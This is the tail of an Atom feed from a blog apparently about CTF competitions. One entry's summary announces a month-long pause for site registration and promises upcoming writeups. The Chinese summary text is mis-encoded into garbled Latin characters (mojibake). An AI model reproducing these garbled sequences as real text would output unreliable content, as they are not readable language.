      &lt;p&gt;ç”±äºç½‘ç«™å¤‡æ¡ˆåŸå› ï¼Œåšå®¢åœæ­¢æ›´æ–°äº†ä¸€ä¸ªæœˆï¼Œæ¥ä¸‹æ¥ä¼šé™†ç»­æŠŠä¸­é—´ç§¯ç´¯ä¸‹çš„æ¯”èµ›writeupå’Œå­¦ä¹ ç»éªŒè¡¥ä¸Šã€‚&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="MISC" scheme="https://www.codemonster.cn/tags/MISC/"/>
    
  </entry>
  
</feed>
